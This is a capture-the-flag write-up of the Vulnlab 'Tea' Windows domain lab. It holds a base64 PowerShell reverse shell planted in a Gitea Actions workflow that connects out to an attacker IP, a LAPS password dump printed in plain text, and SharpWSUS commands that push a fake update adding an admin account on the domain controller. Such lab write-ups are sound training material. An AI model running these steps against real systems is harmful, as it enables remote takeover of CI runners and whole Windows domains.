---
tags:
  - Writeup
  - Vulnlab
  - CI/CD
  - LAPSv2
  - WSUS
---

---
![](https://1897091482-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FI3I73FFqB6GvT8N5Mt1N%2Fuploads%2FcwrTnaFDQV6dMC1dDyXG%2Ftea_slide.png?alt=media&token=449048b6-3ffc-41de-9542-83c08ca65c7c)

- Intermediate Level Windows Active Directory Chain
- You will learn about CI/CD runners, LAPSv2 & WSUS
### User
- Look into CI/CD Runners  
- The Administrator Password is managed
### Root
- The server you compromised has a special role

## Machine Summary

Tea is a two-tiered system that incorporates Gitea as its foundation, along with LAPSv2 and WSUS. To begin, create a new Gitea user and upload a repository containing a CI/CD configuration. Subsequently, establish a runner and activate actions within the repository. Once these steps are completed, you'll be ready to access a shell. From there, you can uncover Administrator credentials due to LAPSv2 and elevate your privileges.

As a local admin, you can take control of the WSUS, enabling you to send payloads to clients within the domain. Leveraging SharpWSUS, you can effortlessly add a new admin on the Domain Controller and establish a connection using evil-winRM. This chain presents three flags for discovery.
## Recon

```ad-summary
title: NMAP
collapse: open

```Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-30 19:45 CET
Nmap scan report for 10.10.187.21
Host is up (0.023s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-30 18:45:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tea.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.tea.vl
| Not valid before: 2023-12-19T15:32:23
|_Not valid after:  2024-06-19T15:32:23
| rdp-ntlm-info:
|   Target_Name: TEA
|   NetBIOS_Domain_Name: TEA
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: tea.vl
|   DNS_Computer_Name: DC.tea.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-01-30T18:46:56+00:00
|_ssl-date: 2024-01-30T18:47:36+00:00; -2s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time:
|   date: 2024-01-30T18:46:59
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Nmap scan report for 10.10.187.22
Host is up (0.022s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=4cecc74671db5ee1; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=5iT29sqj4eD2MfTxEpvStZZRiJk6MTcwNjY0MDMzNTI4NzcxNDkwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 30 Jan 2024 18:45:35 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL3Nydi50ZWEudmw6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL3Nydi50ZWEudmw6MzAwMC9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpemVzIjo
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=61534a106c255a96; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=BKJ_LAZaYM0kUjOdueRIaV7l3Ds6MTcwNjY0MDM0MDg4NTEyNzIwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Tue, 30 Jan 2024 18:45:40 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-01-30T18:47:37+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: TEA
|   NetBIOS_Domain_Name: TEA
|   NetBIOS_Computer_Name: SRV
|   DNS_Domain_Name: tea.vl
|   DNS_Computer_Name: SRV.tea.vl
|   DNS_Tree_Name: tea.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-01-30T18:46:57+00:00
| ssl-cert: Subject: commonName=SRV.tea.vl
| Not valid before: 2023-12-19T15:38:21
|_Not valid after:  2024-06-19T15:38:21
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=1/30%Time=65B943CF%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,2000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=4cecc74671db5ee1;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=5iT29sqj4eD2MfTxEpvStZZRiJk6MTcwNjY0MDMzNTI4NzcxNDkwMA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2030\x20Jan\x202024\x2018:45:35\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x
SF:20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:
SF:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR
SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn
SF:RfdXJsIjoiaHR0cDovL3Nydi50ZWEudmw6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0c
SF:DovL3Nydi50ZWEudmw6MzAwMC9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdl
SF:L3BuZyIsInNpemVzIjo")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Me
SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x2
SF:0GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x2
SF:0no-transform\r\nSet-Cookie:\x20i_like_gitea=61534a106c255a96;\x20Path=
SF:/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=BKJ_LAZaYM0kUjO
SF:dueRIaV7l3Ds6MTcwNjY0MDM0MDg4NTEyNzIwMA;\x20Path=/;\x20Max-Age=86400;\x
SF:20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\
SF:x20Tue,\x2030\x20Jan\x202024\x2018:45:40\x20GMT\r\nContent-Length:\x200
SF:\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2024-01-30T18:47:06
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

```

```ad-important
title: Domains
collapse: open

- **dc.tea.vl**
- **SRV.tea.vl**
```

```ad-error
title: Found Credentials
collapse: open

-  Administrator:R}[[xup#o/6+)g
```

## Initial Access

We discovered a Gitea instance at `srv.tea.vl:3000` and successfully created a user. Additionally, we need to activate runners to utilize Gitea's Action feature. Refer to the documentation for further details: https://docs.gitea.com/usage/actions/overview.

The reverse shell is placed in `.gitea/workflows/demo.yaml`, and Powershell (Base64) proved effective for implementation.

```yaml
name: d3sty bell
run-name: $ is testing out Gitea Actions 🚀
on: [push]

jobs:
  Explore-Gitea-Actions:
    runs-on: windows-latest
    steps:
      - run: powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADAALgA1ADQAIgAsADEAMwAxADIAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

We receive a Shell as `tea\thomas.wallace` and can find our first flag on the Desktop.

```Powershell
PS C:\Users\thomas.wallace\.cache\act\640d2145f128358f\hostexecutor> whoami /all

USER INFORMATION
----------------

User Name          SID
================== ==============================================
tea\thomas.wallace S-1-5-21-4071478895-3826761629-2568933575-1601


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                         Well-known group S-1-5-3                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
TEA\Developers                             Group            S-1-5-21-4071478895-3826761629-2568933575-1602 Mandatory group, Enabled by default, Enabled group
TEA\Server Administration                  Group            S-1-5-21-4071478895-3826761629-2568933575-1603 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                       


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

In the C:\ Directory there a some interesting folders

```
    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs-        12/24/2023   5:36 AM                $Recycle.Bin
d--h--        12/19/2023  10:26 AM                $WinREAgent
d--hsl        12/19/2023   5:49 PM                Documents and Settings
d-----        12/20/2023   2:48 AM                Gitea
d-----        12/19/2023  10:02 AM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        12/23/2023  12:32 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d--h--        12/23/2023  12:40 PM                ProgramData
d--hs-        12/19/2023   5:49 PM                Recovery
d--hs-        12/19/2023   5:48 PM                System Volume Information
d-r---        12/20/2023   2:35 AM                Users
d-----        12/29/2023   2:37 AM                Windows
d-----        12/19/2023  10:05 AM                WSUS-Updates
d--h--        12/24/2023   5:38 AM                _install
-a-hs-         1/30/2024  10:42 AM          12288 DumpStack.log.tmp
-a-hs-         1/30/2024  10:42 AM     1207959552 pagefile.sys
```


## Privilege Escalation

In the `_install` folder, there is an installer for **LAPS**, and there is also a folder for **WSUS-Updates**. We can attempt to extract credentials using *LapsADPassword*, and this method works well for the Administrator.
	- [LAPS 2.0 Internals - XPN InfoSec Blog (xpnsec.com)](https://blog.xpnsec.com/lapsv2-internals/)
	- [Windows LAPS overview | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)

```Powershell
PS C:\_install> Get-LapsADPassword -Identity srv -AsPlainText


ComputerName        : SRV
DistinguishedName   : CN=SRV,OU=Servers,DC=tea,DC=vl
Account             : Administrator
Password            : R}[[xup#o/6+)g
PasswordUpdateTime  : 1/30/2024 10:52:55 AM
ExpirationTimestamp : 2/29/2024 10:52:55 AM
Source              : EncryptedPassword
DecryptionStatus    : Success
AuthorizedDecryptor : TEA\Server Administration
```

With these credentials, we can establish a connection via **evil-winRM** as the Administrator and get our 2nd flag on the Desktop.

---
### SharpWSUS

Due to the WSUS installation, we can attempt an attack on the service using **SharpWSUS**. SharpWSUS is a CSharp tool designed for lateral movement through WSUS. You can find more information in the associated blog.([https://labs.nettitude.com/blog/introducing-sharpwsus/](https://labs.nettitude.com/blog/introducing-sharpwsus/))

- [techspence/SharpWSUS: SharpWSUS is a c# tool for abusing Microsoft Windows Server Update Services for Lateral Movement (github.com)](https://github.com/techspence/SharpWSUS)

```
.\SharpWSUS.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server
C:\WSUS-Updates\WsusContent

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
SRV, 8530, C:\WSUS-Updates\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.tea.vl, 10.10.187.21, 10.0.20348.2031, 1/30/2024 7:53:52 PM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```

#### Payload
We can generate a payload to create a new admin user for us.

```cmd
C:\Users\Administrator\Documents>SharpWSUS.exe create /payload:"C:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c ""net user desty Password123! /add && net localgroup administrators desty /add""
```

After creating our WSUS update, we need to approve it to ensure it gets pushed to the clients. We utilize the Fully Qualified Domain Name (FQDN) of the Domain Controller (dc.tea.vl).

```
C:\Users\Administrator\Documents>SharpWSUS.exe approve /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:dc.tea.vl /groupname:"Awesome Group C2"
```

We need to wait for a few minutes to have the update pushed and installed. The status can be monitored using SharpWSUS.

```
C:\Users\Administrator\Documents>SharpWSUS.exe check /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:dc.tea.vl
```

After a few minutes we´re able to connect via **WinRM** and our fresh created user and get our last flag.

---
